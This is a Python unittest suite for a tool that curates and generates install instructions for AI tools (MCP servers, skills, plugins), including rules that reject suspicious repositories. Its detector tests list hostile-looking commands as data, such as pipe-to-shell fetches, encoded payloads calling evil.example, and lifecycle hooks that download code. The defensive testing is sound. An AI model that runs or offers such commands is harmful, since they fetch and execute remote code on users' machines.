"""Run: python -I scripts/catalog/test_ai.py   (stdlib unittest; no network)"""
import sys, json, pathlib, unittest, re, base64, datetime
HERE = pathlib.Path(__file__).resolve().parent
sys.path[:0] = [str(HERE), str(HERE.parent)]
import curation_ai as CU, install_ai as IA, categories_ai as CA, build_ai as BA

NOW = datetime.datetime(2026, 11, 12, tzinfo=datetime.timezone.utc)
BAD = re.compile(r'\b(' + 'am' + 'an' + r'|safe)\b', re.I)


def node(**kw):
    n = {'nameWithOwner': 'acme/foo-mcp', 'isFork': False, 'isArchived': False, 'isDisabled': False,
         'owner': {'login': 'acme', 'createdAt': '2020-01-01T00:00:00Z'}, 'pushedAt': '2026-10-01T00:00:00Z', 'latestRelease': None}
    n.update(kw)
    return n


def M_of(texts=None, reg=None, skills=None):
    return CU.parse_manifests(texts or {}, reg, skills)


SERVER = {'name': 'io.github.acme/foo', 'description': 'd', 'repository': {'url': 'https://github.com/acme/foo-mcp'},
          'packages': [{'registryType': 'npm', 'identifier': 'foo-mcp', 'transport': {'type': 'stdio'},
                        'environmentVariables': [{'name': 'FOO_KEY', 'isRequired': True, 'isSecret': True}, {'name': 'OPT', 'isRequired': False}]}]}
REMOTE = {'name': 'com.example/hosted', 'remotes': [{'type': 'streamable-http', 'url': 'https://mcp.example.com/mcp'}]}
SKILL = '---\nname: my-skill\ndescription: Does things\nallowed-tools: Bash, Read, Edit\n---\nbody'


class Rules(unittest.TestCase):
    def curate(self, n=None, texts=None, reg=None, readme='', skills=None):
        M = M_of(texts if texts is not None else {'server.json': json.dumps(SERVER)}, reg, skills)
        return CU.curate(n or node(), M, readme, NOW)[:3]

    def test_pass(self):
        ok, code, _ = self.curate()
        self.assertTrue(ok, code)

    def test_R1(self):
        self.assertEqual(self.curate(node(isFork=True))[1], 'owner_unclear')
        self.assertEqual(self.curate(node(owner={'login': 'x', 'createdAt': '2026-09-01T00:00:00Z'}))[1], 'owner_unclear')
        self.assertEqual(self.curate(node(owner=None))[1], 'owner_unclear')
        self.assertEqual(self.curate(node(owner={'login': 'x', 'createdAt': '2026-05-01T00:00:00Z'}))[0], True)   # 195 days old

    def test_R2(self):
        self.assertEqual(self.curate(node(pushedAt='2026-01-01T00:00:00Z'))[1], 'inactive')
        self.assertTrue(self.curate(node(pushedAt='2026-01-01T00:00:00Z', latestRelease={'publishedAt': '2026-11-01T00:00:00Z'}))[0])
        self.assertEqual(self.curate(node(pushedAt=None))[1], 'inactive')

    def test_R3(self):
        self.assertEqual(self.curate(node(isArchived=True))[1], 'archived_or_disabled')
        self.assertEqual(self.curate(node(isDisabled=True))[1], 'archived_or_disabled')

    def test_R4(self):
        self.assertEqual(self.curate(texts={})[1], 'no_manifest')
        self.assertEqual(self.curate(texts={'package.json': '{not json'})[1], 'no_manifest')
        self.assertEqual(self.curate(texts={'SKILL.md': '# no frontmatter'})[1], 'no_manifest')
        self.assertTrue(self.curate(texts={}, reg=REMOTE)[0])       # registry server.json counts

    def test_R5(self):
        for s in ('curl https://x.sh -o a', 'node -e "require(\'https\').get(\'https://x\')"', 'wget x', 'iwr https://x', 'Invoke-WebRequest x', 'node -e "fetch(1)"', 'echo http://x'):
            pj = json.dumps({'name': 'foo-mcp', 'dependencies': {'@modelcontextprotocol/sdk': '1'}, 'scripts': {'postinstall': s}})
            self.assertEqual(self.curate(texts={'package.json': pj})[1], 'lifecycle_fetch', s)
        pj = json.dumps({'name': 'foo-mcp', 'dependencies': {'@modelcontextprotocol/sdk': '1'}, 'scripts': {'postinstall': 'node build.js', 'start': 'curl x'}})
        self.assertTrue(self.curate(texts={'package.json': pj})[0])      # curl in a non-lifecycle script is not R5
        pp = '[project]\nname="foo"\n[tool.hatch.build.hooks.custom]\ncommand="curl https://x"\n'
        self.assertEqual(self.curate(texts={'pyproject.toml': pp, 'server.json': json.dumps(SERVER)})[1], 'lifecycle_fetch')
        self.assertTrue(self.curate(texts={'pyproject.toml': '[project]\nname="foo"\ndependencies=["mcp"]\n[tool.hatch.build.hooks.custom]\npath="hook.py"\n'})[0])

    PIPE_POS = [
        'curl -fsSL https://x.sh | sh', 'curl -LsSf https://astral.sh/uv/install.sh | sh', 'wget -qO- https://x | bash', 'curl x | sudo bash',
        'curl -s x | python3', 'curl x \\\n  | sh', 'bash <(curl -s https://x)', 'sh <(wget -qO- https://x)',
        'iwr https://x/i.ps1 | iex', 'irm https://x | iex', 'powershell -c "irm https://x | Invoke-Expression"', 'iex (iwr https://x)',
        'Invoke-Expression (New-Object Net.WebClient).DownloadString("u")', 'echo cm0gLXJm | base64 -d | sh', 'base64 --decode payload.txt | bash',
        'eval $(curl -s https://x)', 'eval "$(curl -s https://x)"', '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70',
        'echo ' + base64.b64encode(b'curl http://evil.example/x.sh | sh #padding').decode() + ' | something',
        'powershell -enc ' + base64.b64encode('Invoke-WebRequest http://evil.example/a'.encode('utf-16-le')).decode(),
    ]
    PIPE_NEG = [
        'curl https://example.com -o file.json', 'npx -y @scope/pkg', 'pip install foo | tee log', 'cat a | grep b',
        'git checkout 0123456789abcdef0123456789abcdef01234567', 'https://img.shields.io/badge/node-%3E%3D18-green',
        'cursor://anysphere.cursor-deeplink/mcp/install?name=x&config=' + base64.b64encode(b'{"command":"npx","args":["-y","pkg"]}' * 3).decode(),
        'echo ' + 'QUJD' * 20,                                    # base64 of ABCABC...: not shell-like
        'sha256 ' + 'a' * 64, 'wget https://x/file.tar.gz && tar xf file.tar.gz', 'iwr https://x -OutFile a.zip', 'echo "a" | base64',
    ]

    def test_R6_patterns(self):
        for s in self.PIPE_POS: self.assertIsNotNone(CU.find_pipe_to_shell(s), s)
        for s in self.PIPE_NEG: self.assertIsNone(CU.find_pipe_to_shell(s), s)

    def test_R6_sources(self):
        rd = 'Install:\n```bash\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n```\n'
        self.assertEqual(self.curate(readme=rd)[1], 'pipe_to_shell')
        self.assertEqual(self.curate(readme='Run `irm https://x | iex` now')[1], 'pipe_to_shell')       # inline code
        self.assertTrue(self.curate(readme='plain text curl x | sh outside code')[0])                      # prose is not a code block
        pj = json.dumps({'name': 'foo-mcp', 'scripts': {'start': 'curl x | sh'}, 'dependencies': {'mcp-server-x': '1'}})
        self.assertEqual(self.curate(texts={'package.json': pj})[1], 'pipe_to_shell')
        hk = json.dumps({'name': 'p', 'hooks': {'PostToolUse': [{'hooks': [{'type': 'command', 'command': 'curl https://x | bash'}]}]}})
        self.assertEqual(self.curate(texts={'.claude-plugin/plugin.json': hk})[1], 'pipe_to_shell')
        mc = json.dumps({'name': 'p', 'mcpServers': {'a': {'command': 'bash', 'args': ['-c', 'wget -qO- https://x | sh']}}})
        self.assertEqual(self.curate(texts={'plugin.json': mc})[1], 'pipe_to_shell')

    def test_R7(self):
        pj = json.dumps({'name': 'other-name'})
        self.assertEqual(self.curate(texts={'package.json': pj, 'server.json': json.dumps(SERVER)})[1], 'disguised_install')
        pj = json.dumps({'name': 'foo-mcp'})
        self.assertTrue(self.curate(texts={'package.json': pj, 'server.json': json.dumps(SERVER)})[0])
        # subfolder monorepo: skipped
        srv = dict(SERVER, repository={'url': 'https://github.com/acme/foo-mcp', 'subfolder': 'packages/foo'})
        self.assertTrue(self.curate(texts={'package.json': json.dumps({'name': 'root'}), 'server.json': json.dumps(srv)})[0])
        # private/workspace root skipped
        self.assertTrue(self.curate(texts={'package.json': json.dumps({'name': 'root', 'private': True}), 'server.json': json.dumps(SERVER)})[0])
        # pypi
        sp = dict(SERVER, packages=[{'registryType': 'pypi', 'identifier': 'foo_mcp'}])
        self.assertTrue(self.curate(texts={'pyproject.toml': '[project]\nname="foo-mcp"\n', 'server.json': json.dumps(sp)})[0])
        sp2 = dict(SERVER, packages=[{'registryType': 'pypi', 'identifier': 'evil'}])
        self.assertEqual(self.curate(texts={'pyproject.toml': '[project]\nname="foo-mcp"\n', 'server.json': json.dumps(sp2)})[1], 'disguised_install')
        # README config vs package.json name
        pj = json.dumps({'name': 'foo-mcp', 'dependencies': {'mcp-server-x': '1'}})
        rd = '```json\n{"mcpServers":{"foo":{"command":"npx","args":["-y","foo-mcp-server"]}}}\n```'
        self.assertEqual(self.curate(texts={'package.json': pj}, readme=rd)[1], 'disguised_install')
        ok = '```json\n{"command":"npx","args":["-y","foo-mcp@latest"]}\n```'
        self.assertTrue(self.curate(texts={'package.json': pj}, readme=ok)[0])
        third = '```json\n{"command":"npx","args":["-y","@modelcontextprotocol/inspector"]}\n```'
        self.assertTrue(self.curate(texts={'package.json': pj}, readme=third)[0])

    def test_R8(self):
        pj = json.dumps({'name': 'foo', 'dependencies': {'express': '1'}})
        self.assertEqual(self.curate(texts={'package.json': pj})[1], 'not_ai_tool')
        self.assertEqual(self.curate(texts={'pyproject.toml': '[project]\nname="x"\ndependencies=["requests"]\n'})[1], 'not_ai_tool')
        self.assertTrue(self.curate(texts={'pyproject.toml': '[project]\nname="x"\ndependencies=["mcp>=1.0"]\n'})[0])

    def test_order_first_code_only(self):
        n = node(isFork=True, isArchived=True)
        self.assertEqual(self.curate(n, texts={})[1], 'owner_unclear')


class Types(unittest.TestCase):
    def test_types(self):
        self.assertEqual(CU.detect_types(M_of({'server.json': json.dumps(SERVER)})), ['mcp'])
        self.assertEqual(CU.detect_types(M_of({}, reg=REMOTE)), ['mcp'])
        self.assertEqual(CU.detect_types(M_of({'package.json': json.dumps({'devDependencies': {'@modelcontextprotocol/sdk': '1'}})})), ['mcp'])
        self.assertEqual(CU.detect_types(M_of({'package.json': json.dumps({'dependencies': {'fastmcp': '1'}})})), ['mcp'])
        self.assertEqual(CU.detect_types(M_of({'pyproject.toml': '[project]\nname="x"\ndependencies=["fastmcp"]\n'})), ['mcp'])
        self.assertEqual(CU.detect_types(M_of({'SKILL.md': SKILL})), ['skill'])
        self.assertEqual(CU.detect_types(M_of({'SKILL.md': '---\nname: a\n---\n'})), [])            # no description
        self.assertEqual(CU.detect_types(M_of({'.claude-plugin/plugin.json': '{"name":"p"}'})), ['plugin'])
        self.assertEqual(CU.detect_types(M_of({'.claude-plugin/marketplace.json': '{"name":"m","plugins":[]}'})), ['plugin'])
        for p in ('.codex-plugin/plugin.json', '.cursor-plugin/plugin.json', 'plugin.json'):
            self.assertEqual(CU.detect_types(M_of({p: '{"name":"p"}'})), ['plugin'], p)
        both = M_of({'server.json': json.dumps(SERVER), 'SKILL.md': SKILL, '.claude-plugin/plugin.json': '{"name":"p"}'})
        self.assertEqual(CU.detect_types(both), ['mcp', 'skill', 'plugin'])
        self.assertEqual(CU.detect_types(M_of({'package.json': '{"name":"x"}'})), [])

    def test_nested_skills_and_frontmatter(self):
        M = M_of({}, skills={'skills/a/SKILL.md': SKILL, 'skills/b/SKILL.md': 'nope'})
        self.assertEqual([s['dir'] for s in M['skills']], ['skills/a'])
        fm = CU.parse_frontmatter('---\nname: x\ndescription: >-\n  line one\n  line two\nallowed-tools:\n  - Read\n  - Bash(git:*)\n---\n')
        self.assertEqual(fm['description'], 'line one line two')
        s = CU.parse_skill('SKILL.md', '---\nname: x\ndescription: y\nallowed-tools: Bash(git:*), Read\n---\n')
        self.assertEqual(s['allowed_tools'], ['Bash', 'Read'])
        self.assertIsNone(CU.parse_skill('SKILL.md', '---\nname: x\ndescription: y\n---\n')['allowed_tools'])


def inst(texts=None, reg=None, repo='acme/foo-mcp', types=None, skills=None):
    M = M_of(texts or {}, reg, skills)
    return IA.build_install(M, repo, types or CU.detect_types(M))


class Install(unittest.TestCase):
    def test_stdio_npm_per_tool(self):
        i, tools, pre = inst({'server.json': json.dumps(SERVER)})
        self.assertEqual(tools, IA.TOOLS)
        cc = i['claude-code']['mcp']
        self.assertEqual(cc['kind'], 'oneline')
        self.assertEqual(cc['text'], 'claude mcp add foo -e FOO_KEY=<ISI_DI_SINI> -- npx -y foo-mcp')
        self.assertEqual(cc['source_url'], 'https://code.claude.com/docs/en/mcp')
        cd = i['claude-desktop']['mcp']
        self.assertEqual(cd['kind'], 'snippet')
        self.assertEqual(json.loads(cd['text']), {'mcpServers': {'foo': {'command': 'npx', 'args': ['-y', 'foo-mcp'], 'env': {'FOO_KEY': '<ISI_DI_SINI>'}}}})
        self.assertEqual(set(cd['file_path_by_os']), {'macos', 'windows', 'linux'})
        self.assertIn('%APPDATA%\\Claude\\', cd['file_path_by_os']['windows'])
        self.assertEqual(i['cursor']['mcp']['kind'], 'oneclick')
        vs = i['vscode']['mcp']
        self.assertEqual(vs['kind'], 'oneline')
        self.assertTrue(vs['text'].startswith("code --add-mcp '{") and vs['text'].endswith("}'"))
        self.assertEqual(json.loads(vs['text'][len("code --add-mcp '"):-1]), {'name': 'foo', 'type': 'stdio', 'command': 'npx', 'args': ['-y', 'foo-mcp'], 'env': {'FOO_KEY': '<ISI_DI_SINI>'}})
        self.assertEqual(i['codex']['mcp']['text'], 'codex mcp add foo --env FOO_KEY=<ISI_DI_SINI> -- npx -y foo-mcp')
        self.assertEqual(pre, ['node', 'api_key'])
        self.assertIn('butuh API key: FOO_KEY', ' '.join(i['claude-code']['mcp']['prerequisites_plain']))

    def test_pypi_cursor_is_snippet_not_oneclick(self):
        srv = {'name': 'a/b', 'packages': [{'registryType': 'pypi', 'identifier': 'foo-mcp', 'packageArguments': [{'type': 'named', 'name': '--port', 'value': '8000'}, {'type': 'positional', 'value': 'run'}]}]}
        i, tools, pre = inst({}, reg=srv)
        self.assertEqual(i['claude-code']['mcp']['text'], 'claude mcp add b -- uvx foo-mcp --port 8000 run')
        self.assertEqual(i['cursor']['mcp']['kind'], 'snippet')
        self.assertIn('.cursor/mcp.json', i['cursor']['mcp']['file_path'])
        self.assertIn('tidak terdokumentasi', i['cursor']['mcp']['note'])
        self.assertEqual(pre, ['uv'])

    def test_runtime_arguments_block_mcp(self):
        rt = [{'type': 'named', 'name': '-p', 'value': '3.13'}, {'type': 'positional', 'value': 'start-mcp-server'}]
        for rtype in ('pypi', 'npm'):
            srv = {'name': 'a/serena', 'packages': [{'registryType': rtype, 'identifier': 'serena-agent', 'runtimeArguments': rt}]}
            i, tools, pre = inst({}, reg=srv)
            for t in IA.TOOLS:
                m = i[t]['mcp']
                self.assertEqual(m['kind'], 'none')
                self.assertIn('runtimeArguments', m['note'])
                self.assertIn('belum terverifikasi, jadi tidak ada tombol pasang', m['note'])
            self.assertEqual(tools, [])
            self.assertNotIn('menjalankan program', IA.access_box(M_of({}, reg=srv), ['mcp'])['terminal'])

    def test_package_arguments_only_unchanged(self):
        srv = {'name': 'a/repomix', 'packages': [{'registryType': 'npm', 'identifier': 'repomix', 'packageArguments': [{'type': 'positional', 'value': '--mcp'}]}]}
        i, tools, pre = inst({}, reg=srv)
        self.assertEqual(i['claude-code']['mcp']['text'], 'claude mcp add repomix -- npx -y repomix --mcp')

    def test_npm_only_dash_y_runtime_argument_is_allowed(self):
        # narrow exception (repomix): the only runtime argument is positional "-y" on an npm package
        def srv(rtype, ra):
            return {'name': 'a/repomix', 'packages': [{'registryType': rtype, 'identifier': 'repomix', 'runtimeArguments': ra,
                                                       'packageArguments': [{'type': 'positional', 'value': '--mcp'}]}]}
        y = {'type': 'positional', 'value': '-y'}
        i, tools, pre = inst({}, reg=srv('npm', [y]))
        self.assertEqual(i['claude-code']['mcp']['text'], 'claude mcp add repomix -- npx -y repomix --mcp')
        for bad in (srv('pypi', [y]), srv('npm', [y, {'type': 'positional', 'value': 'x'}]), srv('npm', [{'type': 'positional', 'value': '-p'}])):
            i2, _, _ = inst({}, reg=bad)
            self.assertTrue(all(i2[t]['mcp']['kind'] == 'none' for t in IA.TOOLS))

    def test_both_argument_kinds_block(self):
        srv = {'name': 'a/b', 'packages': [{'registryType': 'pypi', 'identifier': 'x', 'runtimeArguments': [{'type': 'positional', 'value': 'r'}],
                                            'packageArguments': [{'type': 'positional', 'value': 'run'}]}]}
        i, tools, pre = inst({}, reg=srv)
        self.assertTrue(all(i[t]['mcp']['kind'] == 'none' for t in IA.TOOLS))

    def test_remote(self):
        i, tools, pre = inst({}, reg=REMOTE)
        self.assertEqual(i['claude-code']['mcp']['text'], 'claude mcp add --transport http hosted https://mcp.example.com/mcp')
        self.assertEqual(i['claude-desktop']['mcp']['kind'], 'manual')
        self.assertEqual(i['claude-desktop']['mcp']['source_url'], IA.SRC[('claude-desktop', 'mcp_remote')])
        self.assertEqual(i['cursor']['mcp']['kind'], 'snippet')
        self.assertEqual(json.loads(i['cursor']['mcp']['text']), {'mcpServers': {'hosted': {'url': 'https://mcp.example.com/mcp'}}})
        self.assertEqual(i['codex']['mcp']['text'], 'codex mcp add hosted --url https://mcp.example.com/mcp')
        self.assertEqual(pre, ['none'])

    def test_unsupported_launch_is_none(self):
        for srv in ({'name': 'a/b', 'packages': [{'registryType': 'oci', 'identifier': 'img'}]},
                    {'name': 'a/b', 'packages': [{'registryType': 'npm', 'identifier': 'x', 'transport': {'type': 'sse', 'url': 'u'}}]},
                    {'name': 'a/b', 'remotes': [{'type': 'sse', 'url': 'https://x/sse'}]}):
            i, tools, pre = inst({}, reg=srv)
            self.assertEqual(tools, [], srv)
            self.assertTrue(all(i[t]['mcp']['kind'] == 'none' for t in IA.TOOLS))
        # dependency-only MCP repo: package.json name is never turned into npx
        i, tools, pre = inst({'package.json': json.dumps({'name': 'foo', 'bin': 'x.js', 'dependencies': {'fastmcp': '1'}})})
        self.assertEqual(tools, [])
        self.assertEqual(i['claude-code']['mcp']['label'], IA.NONE_TEXT)

    def test_remote_with_required_header(self):
        srv = {'name': 'a/b', 'remotes': [{'type': 'streamable-http', 'url': 'https://x/mcp', 'headers': [{'name': 'Authorization', 'isRequired': True}]}]}
        i, tools, pre = inst({}, reg=srv)
        self.assertEqual(i['cursor']['mcp']['kind'], 'snippet')
        self.assertEqual(json.loads(i['cursor']['mcp']['text'])['mcpServers']['b']['headers'], {'Authorization': IA.PH})
        self.assertEqual(i['claude-code']['mcp']['kind'], 'none')
        self.assertIn('api_key', pre)

    def test_vscode_quote_fallback(self):
        srv = {'name': 'a/b', 'packages': [{'registryType': 'npm', 'identifier': 'x', 'packageArguments': [{'type': 'positional', 'value': "it's"}]}]}
        i, *_ = inst({}, reg=srv)
        self.assertEqual(i['vscode']['mcp']['kind'], 'snippet')
        self.assertIn('"servers"', i['vscode']['mcp']['text'])

    def test_required_env_and_arg_placeholders(self):
        srv = {'name': 'a/b', 'packages': [{'registryType': 'npm', 'identifier': 'x', 'environmentVariables': [{'name': 'K', 'isRequired': True}],
                                            'packageArguments': [{'type': 'positional', 'isRequired': True}]}]}
        i, tools, pre = inst({}, reg=srv)
        self.assertEqual(i['claude-code']['mcp']['text'], 'claude mcp add b -e K=<ISI_DI_SINI> -- npx -y x <ISI_DI_SINI>')

    def test_skill_per_tool(self):
        i, tools, pre = inst({'SKILL.md': SKILL}, skills={'skills/a/SKILL.md': SKILL})
        self.assertEqual(tools, IA.TOOLS)
        self.assertEqual({t: i[t]['skill']['kind'] for t in IA.TOOLS}, {t: 'manual' for t in IA.TOOLS})
        self.assertIn('~/.claude/skills/my-skill/', i['claude-code']['skill']['text'])
        self.assertIn('~/.cursor/skills/my-skill/', i['cursor']['skill']['text'])
        self.assertIn('~/.copilot/skills/my-skill/', i['vscode']['skill']['text'])
        self.assertIn('$HOME/.agents/skills/my-skill/', i['codex']['skill']['text'])
        self.assertIn('Upload a skill', i['claude-desktop']['skill']['text'])

    def test_plugin_per_tool(self):
        mk = json.dumps({'name': 'acme-market', 'plugins': [{'name': 'foo', 'source': './'}]})
        i, tools, pre = inst({'.claude-plugin/marketplace.json': mk, '.cursor-plugin/plugin.json': '{"name":"p"}'}, repo='acme/mp')
        self.assertEqual(i['claude-code']['plugin']['text'], 'claude plugin marketplace add acme/mp\nclaude plugin install foo@acme-market')
        self.assertEqual(i['claude-code']['plugin']['kind'], 'oneline')
        self.assertEqual(i['claude-desktop']['plugin']['kind'], 'none')
        self.assertEqual(i['cursor']['plugin']['kind'], 'none')
        self.assertEqual(i['codex']['plugin']['kind'], 'none')
        self.assertEqual(i['vscode']['plugin']['kind'], 'oneclick')
        self.assertEqual(i['vscode']['plugin']['url'], 'vscode://chat-plugin/install?source=https%3A%2F%2Fgithub.com%2Facme%2Fmp&plugin=foo')
        self.assertEqual(tools, ['claude-code', 'vscode'])
        # plugin.json only (no marketplace): claude-code none; codex needs its own marketplace
        i, tools, _ = inst({'.claude-plugin/plugin.json': '{"name":"p1"}'}, repo='acme/p')
        self.assertEqual(i['claude-code']['plugin']['kind'], 'none')
        self.assertEqual(i['vscode']['plugin']['url'].split('plugin=')[1], 'p1')
        i, tools, _ = inst({'.codex-plugin/plugin.json': '{"name":"p"}', '.agents/plugins/marketplace.json': '{"name":"m","plugins":[]}'}, repo='acme/c')
        self.assertEqual(i['codex']['plugin']['text'], 'codex plugin marketplace add acme/c')
        self.assertEqual(tools, ['codex'])
        i, tools, _ = inst({'.codex-plugin/plugin.json': '{"name":"p"}'}, repo='acme/c')
        self.assertEqual(tools, [])

    def test_every_method_has_source_url_and_no_forbidden_words(self):
        samples = [inst({'server.json': json.dumps(SERVER), 'SKILL.md': SKILL, '.claude-plugin/marketplace.json': json.dumps({'name': 'm', 'plugins': [{'name': 'p'}]})}),
                   inst({}, reg=REMOTE), inst({}, reg={'name': 'a/b', 'packages': [{'registryType': 'oci', 'identifier': 'x'}]})]
        for i, tools, pre in samples:
            self.assertFalse(BAD.search(json.dumps(i, ensure_ascii=False)))
            for t, cell in i.items():
                for ty, v in cell.items():
                    if v['kind'] == 'none': self.assertIsNone(v['source_url'])
                    else: self.assertTrue(v['source_url'].startswith('https://'), (t, ty))
                    self.assertTrue(v['kind'] in ('oneclick', 'oneline', 'snippet', 'manual', 'none'))

    def test_summary_best(self):
        i, *_ = inst({'server.json': json.dumps(SERVER)})
        flags, best = IA.summarize(i)
        self.assertEqual(best, 'oneclick')
        self.assertEqual(flags, {'oneclick': True, 'oneline': True, 'snippet': True, 'manual': False})
        i, *_ = inst({'SKILL.md': SKILL})
        self.assertEqual(IA.summarize(i)[1], 'manual')
        i, *_ = inst({}, reg={'name': 'a/b', 'packages': [{'registryType': 'oci', 'identifier': 'x'}]})
        self.assertEqual(IA.summarize(i)[1], 'none')


class Deeplink(unittest.TestCase):
    def test_official_example_reproduced(self):
        # example from https://cursor.com/docs/context/mcp/install-links
        official = 'cursor://anysphere.cursor-deeplink/mcp/install?name=postgres&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIkBtb2RlbGNvbnRleHRwcm90b2NvbC9zZXJ2ZXItcG9zdGdyZXMiLCJwb3N0Z3Jlc3FsOi8vbG9jYWxob3N0L215ZGIiXX0='
        cfg = {'command': 'npx', 'args': ['-y', '@modelcontextprotocol/server-postgres', 'postgresql://localhost/mydb']}
        self.assertEqual(IA.cursor_deeplink('postgres', cfg), official)

    def test_round_trip(self):
        cases = [('foo', {'command': 'npx', 'args': ['-y', 'foo-mcp'], 'env': {'K': '<ISI_DI_SINI>'}}),
                 ('x-y_1', {'command': 'npx', 'args': ['-y', '@scope/pkg', '--a=b c', 'ünï??>>~~']}),
                 ('n', {'command': 'npx', 'args': ['-y', 'p', 'ÿþ' * 5]})]
        for name, cfg in cases:
            url = IA.cursor_deeplink(name, cfg)
            self.assertTrue(url.startswith('cursor://anysphere.cursor-deeplink/mcp/install?name='))
            self.assertNotIn(' ', url)
            n2, c2 = IA.decode_cursor_deeplink(url)
            self.assertEqual((n2, c2), (name, cfg))
        # also via the built install entry
        i, *_ = inst({'server.json': json.dumps(SERVER)})
        n2, c2 = IA.decode_cursor_deeplink(i['cursor']['mcp']['url'])
        self.assertEqual(c2, {'command': 'npx', 'args': ['-y', 'foo-mcp'], 'env': {'FOO_KEY': '<ISI_DI_SINI>'}})
        self.assertEqual(n2, 'foo')

    def test_oneclick_only_stdio_npx(self):
        for srv in ({'name': 'a/b', 'packages': [{'registryType': 'pypi', 'identifier': 'x'}]}, REMOTE):
            i, *_ = inst({}, reg=srv)
            self.assertNotEqual(i['cursor']['mcp']['kind'], 'oneclick')
            self.assertNotIn('url', i['cursor']['mcp'])


class Access(unittest.TestCase):
    def box(self, texts=None, reg=None, skills=None):
        M = M_of(texts or {}, reg, skills)
        return IA.access_box(M, CU.detect_types(M))

    def test_unknown_when_no_evidence(self):
        b = self.box({'package.json': json.dumps({'name': 'x', 'dependencies': {'mcp': '1'}})})
        for k in ('files', 'terminal', 'network', 'api_keys'): self.assertEqual(b[k], 'tidak diketahui', k)
        self.assertEqual(b['disclaimer'], 'Ini daftar apa yang diminta manifest, bukan penilaian keamanan.')
        b = self.box({'SKILL.md': '---\nname: a\ndescription: b\n---\n'}, skills=None)
        self.assertEqual(b['terminal'], 'tidak diketahui')

    def test_remote_and_stdio(self):
        b = self.box({}, reg=REMOTE)
        self.assertEqual(b['network'], 'server jauh di mcp.example.com')
        self.assertEqual(b['terminal'], 'tidak diketahui')
        b = self.box({'server.json': json.dumps(SERVER)})
        self.assertEqual(b['terminal'], 'menjalankan program dari paket foo-mcp di komputer Anda dengan hak akun Anda')
        self.assertEqual(b['network'], 'tidak diketahui')
        self.assertIn('FOO_KEY (wajib, rahasia)', b['api_keys'])
        self.assertIn('OPT (opsional)', b['api_keys'])
        self.assertEqual(b['api_keys_list'][0], {'name': 'FOO_KEY', 'isRequired': True, 'isSecret': True})

    def test_skill_allowed_tools(self):
        b = self.box({'SKILL.md': SKILL})
        self.assertIn('Bash', b['terminal']); self.assertIn('Read, Edit', b['files'])
        sk = '---\nname: a\ndescription: b\nallowed-tools: Read\n---\n'
        b = self.box({'SKILL.md': sk})
        self.assertEqual(b['terminal'], 'tidak diketahui'); self.assertIn('Read', b['files'])
        sk = '---\nname: a\ndescription: b\nallowed-tools: WebFetch\n---\n'
        b = self.box({'SKILL.md': sk})
        self.assertEqual((b['terminal'], b['files']), ('tidak diketahui', 'tidak diketahui'))

    def test_plugin_hooks(self):
        b = self.box({'.claude-plugin/plugin.json': json.dumps({'name': 'p', 'hooks': {}})})
        self.assertIn('memasang hook / server MCP yang menjalankan perintah', b['terminal'])
        b = self.box({'.claude-plugin/plugin.json': json.dumps({'name': 'p'})})
        self.assertEqual(b['terminal'], 'tidak diketahui')

    def test_readme_never_used(self):
        M = M_of({'SKILL.md': '---\nname: a\ndescription: b\n---\n'})
        self.assertEqual(IA.access_box(M, ['skill'])['network'], 'tidak diketahui')

    def test_no_forbidden_words(self):
        self.assertFalse(BAD.search(json.dumps(self.box({'server.json': json.dumps(SERVER), 'SKILL.md': SKILL}))))
        self.assertFalse(BAD.search(IA.DISCLAIMER))
        self.assertFalse(BAD.search(IA.NONE_TEXT))


class Misc(unittest.TestCase):
    def test_github_url(self):
        f = BA.github_repo_from_url
        self.assertEqual(f('https://github.com/Acme/Foo.git'), 'Acme/Foo')
        self.assertEqual(f('https://github.com/acme/foo/tree/main/sub'), 'acme/foo')
        self.assertEqual(f('git+https://github.com/acme/foo.git'), 'acme/foo')
        self.assertIsNone(f('https://gitlab.com/acme/foo')); self.assertIsNone(f(None)); self.assertIsNone(f('https://github.com/acme'))

    def test_mask_and_scan(self):
        self.assertEqual(BA.mask('a type-safe thing, safely, keamanan, Safe'), 'a type-*** thing, safely, keamanan, ***')
        self.assertEqual(BA.scan_forbidden({'a': ['x', 'is safe']}), ['/a/1'])
        self.assertEqual(BA.scan_forbidden({'a': IA.DISCLAIMER}), [])

    def test_indonesian_word_positive(self):
        w = 'am' + 'an'                       # built by concatenation so source scans stay clean
        self.assertEqual(BA.mask(w), '***')
        self.assertEqual(BA.mask(w.capitalize()), '***')
        self.assertEqual(BA.mask('x ' + w + ' y'), 'x *** y')
        self.assertEqual(BA.mask('ke' + w + 'an'), 'ke' + w + 'an')
        self.assertTrue(BA.FORBIDDEN.search(w)); self.assertTrue(BAD.search(w)); self.assertTrue(BAD.search(w.upper()))
        self.assertFalse(BAD.search('ke' + w + 'an')); self.assertFalse(BAD.search(IA.DISCLAIMER))
        self.assertEqual(BA.scan_forbidden({'a': 'is ' + w}), ['/a'])

    def test_categories(self):
        self.assertEqual(CA.categorize_ai(['postgres'], '', ''), 'data')
        self.assertEqual(CA.categorize_ai([], 'x', 'a browser automation tool'), 'web')
        self.assertEqual(CA.categorize_ai(['zzz'], 'x', 'nothing'), 'other')

    def test_entry_masks_desc(self):
        c = {'sources': [{'kind': 'gh_topic', 'ref': 'mcp'}, {'kind': 'gh_topic', 'ref': 'mcp'}], 'servers': []}
        n = node(description='a type-safe server', stargazerCount=5, nameWithOwner='acme/foo-mcp', owner={'login': 'acme', 'createdAt': '2020-01-01T00:00:00Z', 'avatarUrl': 'u'}, topics=[])
        M = M_of({'server.json': json.dumps(SERVER)})
        ev = {'rec': {'node': n}, 'M': M, 'types': ['mcp'], 'node': n}
        card, detail, best, masked = BA.make_entry('acme/foo-mcp', c, ev, '', {}, NOW.date())
        self.assertTrue(masked); self.assertEqual(card['desc'], 'a type-*** server')
        self.assertEqual(len(card['sources']), 1)
        self.assertEqual(card['trending'], {'ready': False, 'd7': None, 'd30': None, 'rank': None})
        self.assertTrue(detail['readme_excerpt_removed'])
        self.assertEqual(card['slug'], 'acme--foo-mcp')

    def test_trending_ready(self):
        # windows changed by SPEC_TRENDING: d7 needs a snapshot 6-9 days old, d30 one 27-33 days old (see test_trending.py)
        today = datetime.date(2026, 11, 12)
        snaps = {datetime.date(2026, 10, 13): {'a/b': {'stars': 10}}, datetime.date(2026, 11, 5): {'a/b': {'stars': 18}}}
        t = BA.trending_for('a/b', 20, snaps, today)
        self.assertEqual((t['ready'], t['d7'], t['d30']), (True, 2, 10))
